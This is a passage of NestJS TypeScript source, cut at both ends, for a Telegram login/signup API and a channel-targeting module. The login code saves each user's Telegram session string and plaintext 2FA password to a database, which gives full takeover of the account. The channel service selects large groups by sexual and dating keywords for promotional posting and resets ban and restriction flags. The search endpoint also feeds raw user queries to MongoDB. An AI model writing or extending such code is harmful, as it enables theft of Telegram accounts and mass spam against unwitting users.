BadRequestException('Invalid response from Telegram server');\r\n                }\r\n\r\n                if (signInResult instanceof Api.auth.AuthorizationSignUpRequired) {\r\n                    this.logger.log(`New user registration required for ${phone}`);\r\n                    const result = await this.handleNewUserRegistration(phone, client, phoneCodeHash);\r\n                    await this.disconnectClient(phone);\r\n                    return result;\r\n                }\r\n\r\n                // Store the session string before processing\r\n                const sessionString = client.session.save() as unknown as string;\r\n                if (!sessionString) {\r\n                    throw new Error('Failed to generate session string');\r\n                }\r\n\r\n                const userData = await this.processLoginResult(signInResult.user, sessionString, password);\r\n                await this.disconnectClient(phone);\r\n                return userData;\r\n            } catch (error) {\r\n                if (error.errorMessage === 'SESSION_PASSWORD_NEEDED') {\r\n                    this.logger.warn(`2FA required for ${phone}`);\r\n                    if (!password) {\r\n                        return {\r\n                            status: 400,\r\n                            message: 'Two-factor authentication required',\r\n                            requires2FA: true\r\n                        };\r\n                    }\r\n                    return await this.handle2FALogin(phone, session.client, password);\r\n                }\r\n                if (error.errorMessage?.includes('PHONE_CODE_INVALID') ||\r\n                    error.errorMessage?.includes('PHONE_CODE_EXPIRED')) {\r\n                    throw new BadRequestException('Invalid OTP,  Try again!');\r\n                }\r\n\r\n                this.logger.warn(`Verification attempt failed for ${phone}: ${error.message}`);\r\n                throw new BadRequestException('Verification failed. Please try again.');\r\n            }\r\n        } catch (error) {\r\n            this.logger.error(`Verification error for ${phone}: ${error.message}`);\r\n\r\n            if (error.message?.includes('No active signup session') ||\r\n                error.message?.includes('Connection failed')) {\r\n                await this.disconnectClient(phone);\r\n            }\r\n\r\n            throw error instanceof BadRequestException ? error :\r\n                new BadRequestException(error.message || 'Verification failed, please try again');\r\n        }\r\n    }\r\n\r\n    private async handle2FALogin(phone: string, client: TelegramClient, password: string): Promise<TgSignupResponse> {\r\n        try {\r\n            this.logger.debug(`Fetching password SRP parameters for ${phone}`);\r\n            const passwordSrpResult = await client.invoke(new Api.account.GetPassword());\r\n\r\n            this.logger.debug(`Computing password check for ${phone}`);\r\n            const passwordCheck = await computeCheck(passwordSrpResult, password);\r\n\r\n            this.logger.debug(`Invoking CheckPassword API for ${phone}`);\r\n            const signInResult = await client.invoke(\r\n                new Api.auth.CheckPassword({\r\n                    password: passwordCheck,\r\n                })\r\n            ) as Api.auth.Authorization;\r\n\r\n            if (!signInResult || !signInResult.user) {\r\n                throw new BadRequestException('Invalid response from Telegram server');\r\n            }\r\n\r\n            this.logger.log(`2FA login successful for ${phone}`);\r\n            const sessionString = client.session.save() as unknown as string;\r\n            if (!sessionString) {\r\n                throw new Error('Failed to generate session string');\r\n            }\r\n\r\n            const userData = await this.processLoginResult(signInResult.user, sessionString, password);\r\n            await this.disconnectClient(phone);\r\n            return userData;\r\n        } catch (error) {\r\n            this.logger.error(`2FA login failed for ${phone}: ${error.message}`, error.stack);\r\n            if (password) {\r\n                throw new BadRequestException('Incorrect 2FA password');\r\n            }\r\n            throw new BadRequestException('2FA password required');\r\n        }\r\n    }\r\n\r\n    private async handleNewUserRegistration(\r\n        phone: string,\r\n        client: TelegramClient,\r\n        phoneCodeHash: string\r\n    ): Promise<TgSignupResponse> {\r\n        try {\r\n            const randomName = `User${Math.random().toString(36).substring(2, 8)}`;\r\n            const signUpResult = await client.invoke(\r\n                new Api.auth.SignUp({\r\n                    phoneNumber: phone,\r\n                    phoneCodeHash,\r\n                    firstName: randomName,\r\n                    lastName: '', // Keep empty for privacy\r\n                })\r\n            ) as Api.auth.Authorization;\r\n\r\n            if (!signUpResult || !signUpResult.user) {\r\n                throw new BadRequestException('Invalid response from Telegram server');\r\n            }\r\n\r\n            const sessionString = client.session.save() as unknown as string;\r\n            if (!sessionString) {\r\n                throw new Error('Failed to generate session string');\r\n            }\r\n\r\n            return await this.processLoginResult(signUpResult.user, sessionString);\r\n        } catch (error) {\r\n            const errorDetails = parseError(error, \"TGSIGNUP\", false);\r\n            this.logger.error(`Failed to register new user: ${errorDetails.message}`);\r\n            throw new BadRequestException(errorDetails.message || 'Failed to register new user');\r\n        }\r\n    }\r\n\r\n    private async processLoginResult(user: any, sessionString: string, password?: string): Promise<TgSignupResponse> {\r\n        try {\r\n            if (!user || !sessionString) {\r\n                throw new Error('Invalid user data or session string');\r\n            }\r\n\r\n            // Add additional user metadata\r\n            const now = new Date();\r\n            const userData: CreateUserDto = {\r\n                mobile: user.phone?.toString()?.replace(/^\\+/, '') || '',\r\n                session: sessionString,\r\n                firstName: user.firstName || '',\r\n                lastName: user.lastName || '',\r\n                username: user.username || '',\r\n                tgId: user.id?.toString() || '',\r\n                twoFA: !!password,\r\n                password: password || null,\r\n                lastActive: now.toISOString().split('T')[0],\r\n                expired: false,\r\n                channels: 0,\r\n                personalChats: 0,\r\n                totalChats: 0,\r\n                otherPhotoCount: 0,\r\n                ownPhotoCount: 0,\r\n                ownVideoCount: 0,\r\n                otherVideoCount: 0,\r\n                recentUsers: [],\r\n                calls: {\r\n                    chatCallCounts: [],\r\n                    incoming: 0,\r\n                    outgoing: 0,\r\n                    totalCalls: 0,\r\n                    video: 0,\r\n                },\r\n                contacts: 0,\r\n                movieCount: 0,\r\n                msgs: 0,\r\n                photoCount: 0,\r\n                videoCount: 0,\r\n                gender: 'unknown',\r\n            };\r\n\r\n            // Validate required fields\r\n            if (!userData.mobile || !userData.tgId) {\r\n                throw new Error('Invalid user data received from Telegram');\r\n            }\r\n\r\n            await this.usersService.create(userData);\r\n\r\n            return {\r\n                status: 200,\r\n                message: 'Registration successful',\r\n                session: sessionString,\r\n            };\r\n        } catch (error) {\r\n            this.logger.error('Error processing login result:', error);\r\n            if (error instanceof BadRequestException) {\r\n                throw error;\r\n            }\r\n            throw new InternalServerErrorException('Failed to complete registration');\r\n        }\r\n    }\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform } from 'class-transformer';\r\nimport { IsString, IsNotEmpty, IsOptional, Matches, MinLength } from 'class-validator';\r\n\r\nexport class SendCodeDto {\r\n    @ApiProperty({\r\n        description: 'Phone number to send the verification code to (international format)',\r\n        example: '+919876543210'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    @Matches(/^\\+\\d{8,15}$/, { message: 'Invalid phone number format' })\r\n    phone: string;\r\n}\r\n\r\nexport class VerifyCodeDto {\r\n    @ApiProperty({\r\n        description: 'Phone number used for verification (international format)',\r\n        example: '919876543210'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    @Matches(/^\\+\\d{8,15}$/, { message: 'Invalid phone number format' })\r\n    phone: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Verification code received',\r\n        example: '12345'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    @Matches(/^\\d{5}$/, { message: 'Code must be exactly 5 digits' })\r\n    code: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Two-factor authentication password if required',\r\n        example: 'yourSecurePassword123',\r\n        required: false\r\n    })\r\n    @IsString()\r\n    @IsOptional()\r\n    @Transform(({ value }) => value === '' ? undefined : value)\r\n    password?: string | undefined;\r\n\r\n}\r\n\r\nexport class TgSignupResponse {\r\n    @ApiProperty({\r\n        description: 'Operation status code',\r\n        example: 200\r\n    })\r\n    status: number;\r\n\r\n    @ApiProperty({\r\n        description: 'Response message',\r\n        example: 'Login successful'\r\n    })\r\n    message: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Phone code hash for verification',\r\n        example: 'abc123xyz',\r\n        required: false\r\n    })\r\n    phoneCodeHash?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Whether the code was sent via app',\r\n        example: true,\r\n        required: false\r\n    })\r\n    isCodeViaApp?: boolean;\r\n\r\n    @ApiProperty({\r\n        description: 'Session string for authenticated client',\r\n        required: false\r\n    })\r\n    session?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Whether 2FA is required',\r\n        example: false,\r\n        required: false\r\n    })\r\n    requires2FA?: boolean;\r\n}","import { Controller, Post, Body, BadRequestException, HttpException, UseGuards, Logger, HttpStatus, ValidationPipe, UsePipes } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiResponse, ApiExtraModels } from '@nestjs/swagger';\r\nimport { TgSignupService } from './TgSignup.service';\r\nimport { SendCodeDto, VerifyCodeDto, TgSignupResponse } from './dto/tg-signup.dto';\r\nimport { parseError } from '../../utils/parseError';\r\n\r\n@Controller('tgsignup')\r\n@ApiTags('tgsignup')\r\n@UsePipes(new ValidationPipe({\r\n    transform: true,\r\n    whitelist: true,\r\n    forbidNonWhitelisted: true,\r\n    transformOptions: { enableImplicitConversion: true }\r\n}))\r\n@ApiExtraModels(SendCodeDto, VerifyCodeDto, TgSignupResponse)\r\nexport class TgSignupController {\r\n    private readonly logger = new Logger(TgSignupController.name);\r\n\r\n    constructor(private readonly tgSignupService: TgSignupService) { }\r\n\r\n    @Post('send-code')\r\n    @ApiOperation({\r\n        summary: 'Send verification code to phone number',\r\n        description: 'Initiates the signup process by sending a verification code via Telegram'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.CREATED,\r\n        type: TgSignupResponse,\r\n        description: 'Code sent successfully'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.BAD_REQUEST,\r\n        description: 'Invalid phone number or failed to send code',\r\n        schema: {\r\n            type: 'object',\r\n            properties: {\r\n                statusCode: { type: 'number', example: 400 },\r\n                message: { type: 'string', example: 'Invalid phone number format' },\r\n                error: { type: 'string', example: 'Bad Request' }\r\n            }\r\n        }\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.TOO_MANY_REQUESTS,\r\n        description: 'Rate limit exceeded'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.INTERNAL_SERVER_ERROR,\r\n        description: 'Internal server error occurred'\r\n    })\r\n    async sendCode(@Body() sendCodeDto: SendCodeDto): Promise<TgSignupResponse> {\r\n        try {\r\n            this.logger.debug(`[SEND_CODE] Request received for phone: ${sendCodeDto.phone}`);\r\n            const result = await this.tgSignupService.sendCode(sendCodeDto.phone);\r\n\r\n            return {\r\n                status: HttpStatus.CREATED,\r\n                message: 'Code sent to your Telegram App',\r\n                phoneCodeHash: result.phoneCodeHash,\r\n                isCodeViaApp: result.isCodeViaApp\r\n            };\r\n        } catch (error) {\r\n            this.logger.error(`[SEND_CODE] Error for phone: ${sendCodeDto.phone}`, {\r\n                error,\r\n                stack: error.stack\r\n            });\r\n\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    @Post('verify')\r\n    @ApiOperation({\r\n        summary: 'Verify code and complete signup/login',\r\n        description: 'Verifies the code sent to phone and completes the signup/login process'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.OK,\r\n        type: TgSignupResponse,\r\n        description: 'Verification successful'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.BAD_REQUEST,\r\n        description: 'Invalid code or verification failed'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.TOO_MANY_REQUESTS,\r\n        description: 'Rate limit exceeded'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.INTERNAL_SERVER_ERROR,\r\n        description: 'Internal server error occurred'\r\n    })\r\n    async verifyCode(@Body() verifyCodeDto: VerifyCodeDto): Promise<TgSignupResponse> {\r\n        try {\r\n            this.logger.debug(`[VERIFY_CODE] Request received for phone: ${verifyCodeDto.phone}`);\r\n            \r\n            const result = await this.tgSignupService.verifyCode(\r\n                verifyCodeDto.phone,\r\n                verifyCodeDto.code,\r\n                verifyCodeDto.password\r\n            );\r\n\r\n            return {\r\n                status: result.requires2FA ? HttpStatus.BAD_REQUEST : HttpStatus.OK,\r\n                message: result.message || 'Successfully logged in',\r\n                session: result.session,\r\n                requires2FA: result.requires2FA\r\n            };\r\n        } catch (error) {\r\n            this.logger.error(`[VERIFY_CODE] Error for phone: ${verifyCodeDto.phone}`, {\r\n                error,\r\n                stack: error.stack\r\n            });\r\n\r\n            throw error;\r\n        }\r\n    }\r\n}\r\n","// src/activechannels/activechannels.controller.ts\nimport { Controller, Get, Post, Body, Patch, Param, Delete, NotFoundException, Query, BadRequestException } from '@nestjs/common';\nimport { ActiveChannelsService } from './active-channels.service';\nimport { CreateActiveChannelDto } from './dto/create-active-channel.dto';\nimport { UpdateActiveChannelDto } from './dto/update-active-channel.dto';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiBody } from '@nestjs/swagger';\nimport { ActiveChannel } from './schemas/active-channel.schema';\nimport { AddReactionDto } from './dto/add-reaction.dto';\n\n@ApiTags('Active Channels')\n@Controller('active-channels')\nexport class ActiveChannelsController {\n  constructor(private readonly activeChannelsService: ActiveChannelsService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new active channel' })\n  async create(@Body() createActiveChannelDto: CreateActiveChannelDto) {\n    return this.activeChannelsService.create(createActiveChannelDto);\n  }\n\n  @Post('createMultiple')\n  @ApiOperation({ summary: 'Create multiple channels' })\n  @ApiBody({ type: [CreateActiveChannelDto] })\n  async createMultiple(@Body() createChannelDtos: CreateActiveChannelDto[]): Promise<string> {\n    return this.activeChannelsService.createMultiple(createChannelDtos);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search channels by filters' })\n  @ApiQuery({ name: 'channelId', required: false, type: String })\n  @ApiQuery({ name: 'broadcast', required: false, type: Boolean })\n  @ApiQuery({ name: 'canSendMsgs', required: false, type: Boolean })\n  @ApiQuery({ name: 'participantsCount', required: false, type: Number })\n  @ApiQuery({ name: 'restricted', required: false, type: Boolean })\n  @ApiQuery({ name: 'sendMessages', required: false, type: Boolean })\n  @ApiQuery({ name: 'title', required: false, type: String })\n  @ApiQuery({ name: 'username', required: false, type: String })\n  @ApiQuery({ name: 'wordRestriction', required: false, type: Number })\n  @ApiQuery({ name: 'dMRestriction', required: false, type: Number })\n  @ApiQuery({ name: 'availableMsgs', required: false, type: [String] })\n  @ApiQuery({ name: 'reactions', required: false, type: [String] })\n  @ApiQuery({ name: 'banned', required: false, type: Boolean })\n  @ApiQuery({ name: 'reactRestricted', required: false, type: Boolean })\n  @ApiQuery({ name: 'megagroup', required: false, type: Boolean })\n  search(@Query() query: any): Promise<ActiveChannel[]> {\n    console.log(query);\n    return this.activeChannelsService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all active channels' })\n  async findAll() {\n    return this.activeChannelsService.findAll();\n  }\n\n  @Get(':channelId')\n  @ApiOperation({ summary: 'Get an active channel by channelId' })\n  //@apiresponse({ status: 200, description: 'Return the active channel', type: ActiveChannel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async findOne(@Param('channelId') channelId: string) {\n    return this.activeChannelsService.findOne(channelId);\n  }\n\n  @Patch(':channelId')\n  @ApiOperation({ summary: 'Update an active channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully updated.', type: ActiveChannel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async update(@Param('channelId') channelId: string, @Body() updateActiveChannelDto: UpdateActiveChannelDto) {\n    return this.activeChannelsService.update(channelId, updateActiveChannelDto);\n  }\n\n  @Delete(':channelId')\n  @ApiOperation({ summary: 'Delete an active channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully deleted.' })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async remove(@Param('channelId') channelId: string) {\n    return this.activeChannelsService.remove(channelId);\n  }\n\n  @Post(':channelId/reactions')\n  @ApiOperation({ summary: 'Add reaction to chat group' })\n  addReaction(@Param('channelId') channelId: string, @Body() addReactionDto: AddReactionDto): Promise<ActiveChannel> {\n    if (!addReactionDto.reactions) {\n      throw new BadRequestException('Reaction is required');\n    }\n    return this.activeChannelsService.addReactions(channelId, addReactionDto.reactions);\n  }\n\n  @Get(':channelId/reactions/random')\n  @ApiOperation({ summary: 'Get a random reaction from chat group' })\n  getRandomReaction(@Param('channelId') channelId: string): Promise<string> {\n    return this.activeChannelsService.getRandomReaction(channelId);\n  }\n\n  @Delete(':channelId/reactions')\n  @ApiOperation({ summary: 'Remove reaction from chat group' })\n  removeReaction(@Param('channelId') channelId: string, @Body() addReactionDto: AddReactionDto): Promise<ActiveChannel> {\n    if (!addReactionDto.reactions) {\n      throw new BadRequestException('Reaction is required');\n    }\n    return this.activeChannelsService.removeReaction(channelId, addReactionDto.reactions[0]);\n  }\n}\n","// src/activechannels/activechannels.module.ts\nimport { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { ActiveChannelsService } from './active-channels.service';\nimport { ActiveChannelsController } from './active-channels.controller';\nimport { ActiveChannel, ActiveChannelSchema } from './schemas/active-channel.schema';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { PromoteMsgModule } from '../promote-msgs/promote-msgs.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: ActiveChannel.name, schema: ActiveChannelSchema }]),\n    PromoteMsgModule\n  ],\n  controllers: [ActiveChannelsController],\n  providers: [ActiveChannelsService],\n  exports: [ActiveChannelsService]\n})\nexport class ActiveChannelsModule { }\n","import { PromoteMsgsService } from './../promote-msgs/promote-msgs.service';\n// src/activechannels/activechannels.service.ts\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateActiveChannelDto } from './dto/create-active-channel.dto';\nimport { UpdateActiveChannelDto } from './dto/update-active-channel.dto';\nimport { ActiveChannel, ActiveChannelDocument } from './schemas/active-channel.schema';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\n\n@Injectable()\nexport class ActiveChannelsService {\n  constructor(\n    @InjectModel(ActiveChannel.name) private activeChannelModel: Model<ActiveChannelDocument>,\n    @Inject(forwardRef(() => PromoteMsgsService))\n    private promoteMsgsService: PromoteMsgsService\n  ) {}\n\n  async create(createActiveChannelDto: CreateActiveChannelDto): Promise<ActiveChannel> {\n    createActiveChannelDto.availableMsgs = Object.keys(await this.promoteMsgsService.findOne())\n    const createdChannel = new this.activeChannelModel(createActiveChannelDto);\n    return createdChannel.save();\n  }\n\n  \n  async createMultiple(createChannelDtos: CreateActiveChannelDto[]): Promise<string> {\n    const bulkOps = createChannelDtos.map((dto) => ({\n      updateOne: {\n        filter: { channelId: dto.channelId },\n        update: { $set: dto },\n        upsert: true\n      }\n    }));\n\n    await this.activeChannelModel.bulkWrite(bulkOps, { ordered: false });\n    return 'Channels Saved';\n  }\n\n  async findAll(): Promise<ActiveChannel[]> {\n    return this.activeChannelModel.find().exec();\n  }\n\n  async findOne(channelId: string): Promise<ActiveChannel> {\n    const channel = (await this.activeChannelModel.findOne({ channelId }).exec())?.toJSON();\n    return channel;\n  }\n\n  async update(channelId: string, updateActiveChannelDto: UpdateActiveChannelDto): Promise<ActiveChannel> {\n    delete updateActiveChannelDto[\"_id\"]\n    const updatedChannel = await this.activeChannelModel.findOneAndUpdate(\n      { channelId },\n      { $set: updateActiveChannelDto },\n      { new: true, upsert: true },\n    ).exec();\n    return updatedChannel;\n  }\n\n  async removeFromAvailableMsgs(channelId: string, msg: string) {\n    return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $pull: { availableMsgs: msg } })\n  }\n\n  async addToAvailableMsgs(channelId: string, msg: string) {\n    return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $addToSet: { availableMsgs: msg } })\n  }\n\n  async remove(channelId: string): Promise<void> {\n    const result = await this.activeChannelModel.findOneAndDelete({ channelId }).exec();\n  }\n\n  async search(filter: any): Promise<ActiveChannel[]> {\n    console.log(filter)\n    return this.activeChannelModel.find(filter).exec();\n  }\n\n  async addReactions(channelId: string, reactions: string[]): Promise<ActiveChannel> {\n    const channel = await this.activeChannelModel.findOneAndUpdate({ channelId }, {\n      $addToSet: { reactions: reactions }\n    })\n    return channel;\n  }\n\n  async getRandomReaction(channelId: string): Promise<string> {\n    const channel = (await this.activeChannelModel.findOne({ channelId }).exec())?.toJSON();\n    if (!channel) {\n      return undefined;\n    }\n    if (channel.reactions.length === 0) {\n      return undefined;\n    }\n    const randomIndex = Math.floor(Math.random() * channel.reactions.length);\n    return channel.reactions[randomIndex];\n  }\n\n  async removeReaction(channelId: string, reaction: string): Promise<ActiveChannel> {\n    const channel = await this.activeChannelModel.findOneAndUpdate({ channelId }, {\n      $pull: { reactions: reaction },\n    })\n    return channel;\n  }\n\n  async getActiveChannels(limit = 50, skip = 0, notIds = []) {\n    const query = {\n      '$and':\n        [\n          {\n            '$or':\n              [\n                { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n                { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n              ]\n          },\n          {\n            '$or': [\n              { title: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n              { username: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n            ]\n          },\n          {\n            channelId: { '$nin': notIds },\n            participantsCount: { $gt: 600 },\n            username: {$ne: null},\n            canSendMsgs: true,\n            restricted: false,\n            forbidden: false\n          }\n        ]\n    }\n\n    const sort: Record<string, 1 | -1> = { participantsCount: -1 }\n    try {\n      const result: ActiveChannel[] = await this.activeChannelModel.aggregate([\n        { $match: query },\n        { $skip: skip },\n        { $limit: limit },\n        { $sort: sort }, // Sort by the random field\n        { $project: { randomField: 0 } } // Remove the random field from the output\n      ]).exec();\n      return result;\n    } catch (error) {\n      console.error('Error:', error);\n      return [];\n    }\n  }\n  async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<ActiveChannel[]> {\n    try {\n      if (!query) {\n        throw new BadRequestException('Query is invalid.');\n      }\n      const queryExec = this.activeChannelModel.find(query);\n\n      if (sort) {\n        queryExec.sort(sort);\n      }\n\n      if (limit) {\n        queryExec.limit(limit);\n      }\n\n      if (skip) {\n        queryExec.skip(skip);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw new InternalServerErrorException(error.message);\n    }\n  }\n\n  async resetWordRestrictions() {\n    await fetchWithTimeout(`${notifbot()}&text=Request Received for Reset Available Msgs`);\n    try {\n      await this.activeChannelModel.updateMany({\n        banned: false\n      }, {\n        $set: {\n          \"wordRestriction\": 0,\n          \"dMRestriction\": 0\n        }\n      })\n    } catch (e) {\n      console.log(parseError(e))\n    }\n  }\n\n  async resetAvailableMsgs() {\n    await fetchWithTimeout(`${notifbot()}&text=Request Received for Reset Available Msgs`);\n    try {\n      const data = await this.promoteMsgsService.findOne();\n      const keys = Object.keys(data);\n      await this.activeChannelModel.updateMany(\n        {\n          $expr: {\n            $lt: [{ $size: { $ifNull: [\"$availableMsgs\", []] } }, 5]\n          }\n        },\n        {\n          $set: {\n            \"wordRestriction\": 0,\n            \"dMRestriction\": 0,\n            \"banned\": false,\n            \"availableMsgs\": keys\n          }\n        }\n      );\n    } catch (e) {\n      console.log(parseError(e))\n    }\n  }\n\n  async updateBannedChannels() {\n    await fetchWithTimeout(`${notifbot()}&text=Request Received for update banned Channels`);\n    await this.activeChannelModel.updateMany({ $or: [{ banned: true }, { private: true }] }, {\n      $set: {\n        \"wordRestriction\": 0,\n        \"dMRestriction\": 0,\n        banned: false,\n        \"private\": false\n      }\n    })\n  }\n\n  async updateDefaultReactions() {\n    await this.activeChannelModel.updateMany({}, {\n      $set: {\n        reactions: [\n          '❤', '🔥', '👏', '🥰', '😁', '🤔',\n          '🤯', '😱', '🤬', '😢', '🎉', '🤩',\n          '🤮', '💩', '🙏', '👌', '🕊', '🤡',\n          '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\n          '🤣', '💔', '🏆', '😭', '😴', '👍',\n          '🌚', '⚡', '🍌', '😐', '💋', '👻',\n          '👀', '🙈', '🤝', '🤗', '🆒',\n          '🗿', '🙉', '🙊', '🤷', '👎'\n        ]\n      }\n    })\n  }\n}\n","import { ApiProperty,  } from '@nestjs/swagger';\n\nexport class AddReactionDto  {\n    @ApiProperty({required: true})\n    reactions: string[]\n}\n","// src/activechannels/dto/create-activechannel.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateActiveChannelDto {\n  @ApiProperty()\n  channelId: string;\n\n  @ApiProperty({ default: false })\n  broadcast: boolean;\n\n  @ApiProperty({ default: true })\n  canSendMsgs: boolean;\n\n  @ApiProperty({ default: 300 })\n  participantsCount: number;\n\n  @ApiProperty({ default: false })\n  restricted: boolean;\n\n  @ApiProperty({ default: true })\n  sendMessages: boolean;\n\n  @ApiProperty({ default: false })\n  reactRestricted?: boolean = false;\n\n  @ApiProperty()\n  title: string;\n\n  @ApiProperty()\n  username: string;\n\n  @ApiProperty({ default: 0 })\n  wordRestriction?: number = 0;\n\n  @ApiProperty({ default: 0 })\n  dMRestriction?: number = 0;\n\n  @ApiProperty({ type: [String] })\n  availableMsgs?: string[];\n\n  @ApiProperty({\n    type: [String], default: [\n      '❤', '🔥', '👏', '🥰', '😁', '🤔',\n      '🤯', '😱', '🤬', '😢', '🎉', '🤩',\n      '🤮', '💩', '🙏', '👌', '🕊', '🤡',\n      '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\n      '🤣', '💔', '🏆', '😭', '😴', '👍',\n      '🌚', '⚡', '🍌', '😐', '💋', '👻',\n      '👀', '🙈', '🤝', '🤗', '🆒',\n      '🗿', '🙉', '🙊', '🤷', '👎'\n    ]\n  })\n  reactions?: string[] = [\n    '❤', '🔥', '👏', '🥰', '😁', '🤔',\n    '🤯', '😱', '🤬', '😢', '🎉', '🤩',\n    '🤮', '💩', '🙏', '👌', '🕊', '🤡',\n    '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\n    '🤣', '💔', '🏆', '😭', '😴', '👍',\n    '🌚', '⚡', '🍌', '😐', '💋', '👻',\n    '👀', '🙈', '🤝', '🤗', '🆒',\n    '🗿', '🙉', '🙊', '🤷', '👎'\n  ];\n\n  @ApiProperty({ default: false })\n  banned?: boolean = false;\n\n  @ApiProperty({ default: true, required: false })\n  megagroup?: boolean;\n\n  @ApiProperty({ default: false, required: false })\n  forbidden?: boolean\n\n  @ApiProperty({\n    description: 'Whether the channel is private',\n    example: false,\n    required: false,\n  })\n  private: boolean = false;\n}\n","// src/activechannels/dto/update-activechannel.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateActiveChannelDto } from './create-active-channel.dto';\n\nexport class UpdateActiveChannelDto extends PartialType(CreateActiveChannelDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\nimport * as mongoose from 'mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { defaultMessages, defaultReactions } from '../../../utils';\n\nexport type ActiveChannelDocument = ActiveChannel & Document;\n\n@Schema({ collection: 'activeChannels', versionKey: false, autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n })\nexport class ActiveChannel {\n  @ApiProperty({ required: true })\n  @Prop({ required: true, unique: true })\n  channelId: string;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  broadcast: boolean;\n\n  @ApiProperty({ default: true })\n  @Prop({ default: true })\n  canSendMsgs: boolean;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  participantsCount: number;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  restricted: boolean;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  sendMessages: boolean;\n\n  @ApiProperty({ required: true })\n  @Prop({ required: true })\n  title: string;\n\n  @ApiProperty({ required: false, default: null })\n  @Prop({ required: false, default: null })\n  username: string;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  wordRestriction: number;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  dMRestriction: number;\n\n  @ApiProperty({ type: [String], default:defaultMessages })\n  @Prop({ type: [String], default: defaultMessages })\n  availableMsgs: string[];\n\n  @ApiProperty({ type: [String], default: defaultReactions })\n  @Prop({\n    type: [String], default: defaultReactions\n  })\n  reactions: string[];\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  banned: boolean;\n\n  @ApiProperty({ default: true })\n  @Prop({ default: true })\n  megagroup: boolean;\n\n  @ApiProperty({ default: false})\n  @Prop({ default: false })\n  private: boolean;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  reactRestricted: boolean\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  